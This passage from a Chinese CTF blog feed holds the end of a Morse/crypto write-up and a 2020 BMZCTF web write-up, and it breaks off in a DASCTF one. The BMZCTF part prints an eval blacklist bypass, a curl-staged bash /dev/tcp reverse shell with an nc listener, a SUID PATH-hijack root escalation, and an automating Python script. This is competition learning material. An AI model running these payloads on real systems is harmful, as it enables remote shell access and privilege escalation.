DaJiBei?</code></p><p>调整好格式跑一遍，得到<code>thrEE_means_3</code>，尝试各种单表加密均无果，根据hint4，对原始文件进行尝试还是无果，最后比赛快结束了，放出直接提示hint5，尝试将全篇小写转换为<code>.</code>，大写转换为<code>-</code>解密，发现摩斯密码表并不是固定位数，怕是要爆破排列组合，放弃了。</p><p>赛后出题人 @cheyenne 指点，本题摩斯密码统一采用五位一组，由总数为245位可得。</p><p>由于本人python正在自学水平一般，套用之前写过的一套C的替换程序</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ： 2021/1/24 13:58@Auth ： gyy@Blog ：http://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token char">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token char">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token char">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token char">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token char">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token char">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>浓浓的菜鸡味~，跑出结果</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>拿去解密得</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>看到ascii码<code> 102 108 97 103</code>立马起了反应，这是<code>flag</code>的ascii码，所以是每两个或三个组合成一个字符</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>最后得到flag：<code>flag&#123;SEVen_means_8&#125;</code></p><p>无限接近答案，但密码学爷爷太强了呜呜呜</p><hr><p>有些收获吧，如有问题希望大佬们斧正。2021一起学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021</title>
      <link href="article/2021/"/>
      <url>article/2021/</url>
      
        <content type="html"><![CDATA[<p align="center">展望2021</p><span id="more"></span>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020BMZctf-Writeup</title>
      <link href="article/bmzctf2020/"/>
      <url>article/bmzctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>随缘做了两道web</p><p>昵称：Err0r</p><span id="more"></span><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'echo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'preg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'server'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'chr'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ascii'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'replace'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'scan'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ini_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcntl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'open'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'current'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'local'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'require'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，但肯定还有能用的，<code>&lt;、&gt;、&quot;</code>因为<code>htmlspecialchars</code>也是不能用的</p><p>往无参数RCE方向走发现不太可行，最后利用<code>base_convert</code>构造语句</p><p>把<code>system</code>由base36转为base10，利用<code>base_convert(2146934604002,10,36)</code>发现可以执行系统命令，于是想读取根目录flag发现<code>/</code>传不进去，于是继续<code>base_convert(16191,10,36)</code>，利用<code>chr</code>函数转换<code>/</code>，最终读取flag</p><p>payload：<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315" loading="lazy"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>主要考察反弹shell，提权</p><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&lt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\>'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\@'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\*'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\)'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\!'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\='</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\.'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&#125;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&#123;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行，<code>ip</code>经过blacklist过滤后exec执行，但是测着发现foreach会每次取一位然后来执行，执行多次，也就是说只要不含<code>b</code>就可以执行，这里可以直接执行，但限制了18个字符的长度限制发挥，尝试反弹shell，明显反弹shell第一个单词<code>bash</code>会被过滤，另寻方法。</p><p>首先就执行<code>find / -name fl*&gt;1</code>，执行后输出结果到文件1，结果发现根本就没有flag！</p><p>测试echo可写，于是准备写个一句话木马，结果发现写的.php不执行，应该是写了规则。</p><p>于是准备写个<code>.htaccess</code>，结果一写直接500内部服务报错。</p><p>老实弹shell吧。</p><p>想直接写<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>，结果发现<code>&amp;</code>写不进去，测试发现靶机可连外网，于是在自己服务器上写个名为1的文件，内容为<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>再在靶机写个文件<code>1d</code>，内容为<code>curl ip/1&gt;1</code></p><p>运行<code>sh 1d</code>，发现不行，估计没有执行权限，赋予，<code>chmod 777 1d</code>，靶机运行了curl命令，访问我的服务器下载了文件1，这样就成功写了反弹shell的命令</p><p>在我的服务器监听端口，<code>nc -lvp [port]</code></p><p>再给1赋予执行权限<code>chmod 777 1</code>，需要用bash执行，可是不可以含有<code>b</code>，于是利用<code>?</code>和<code>[a-c]</code>，即执行<code>/?in/[a-c]ash 1</code></p><p>我的服务器成功getshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023" loading="lazy"><p>根目录下没有发现flag，也没有readflag，找也找不到flag，有个<code>start.sh</code>，读取一下看看</p><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@2a4c1fe2f663:/var/www/html$ <span class="token function">cat</span> /start.sh<span class="token function">cat</span> /start.sh<span class="token comment">#!/bin/bash </span><span class="token function">chmod</span> <span class="token number">755</span> index.phpgcc /root/demo.c <span class="token parameter variable">-o</span> love<span class="token function">mv</span> love /usr/bin/love<span class="token function">chmod</span> u+s /usr/bin/love<span class="token function">rm</span> /var/log/apache2/access.log<span class="token function">rm</span> /var/log/apache2/error.log</code></pre><p>关键在这个<code>/user/bin/love</code></p><p>读出来看看，服务器开监听端口，靶机shell执行<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119" loading="lazy"><p>成功拿到文件，拷下来反编译一下(web狗汗颜)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787" loading="lazy"><p>结果就是系统执行个ps命令</p><p>结合find发现了的一点东西</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363" loading="lazy"><p><code>/root</code>目录没有权限，也许可能考点就是提权了</p><p>这是一个具有SUID权限的程序，在tmp目录写个内容为<code>/bin/bash</code>的ps文件，添加进环境变量，这样执行程序调用ps命令会优先从这里执行，而这里是我们伪造的ps命令，然后相当于以高级权限执行了<code>/bin/bash</code>。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>成功提权，直接<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573" loading="lazy"><p>理解了师傅之前说的，提权，才是开始。</p><p>是的，权限真香，这才刚刚开始</p><p>后面再研究吧</p><p>附上一键弹shell脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/26 20:36@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有收获，不枉这两题，尤其的第二题，非常有价值。</p><p>当然不能小看第一题，别看WP短短几行，背后是无数次的尝试与探索，第二题更是如此。</p><p>2020年最后一份WP，还有很长路要走，加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020DASctf-Writeup</title>
      <link href="article/dasctf2020/"/>
      <url>article/dasctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p><p>队伍成员：</p><p>gyy，Trick，X06</p><p>队伍情况：</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy"><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy"><hr><p>继续学习吧，还是太菜了</p><span id="more"></span><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p><p>打开即为空的json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy"><p>给了源码，关键web逻辑<code>routes\index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token 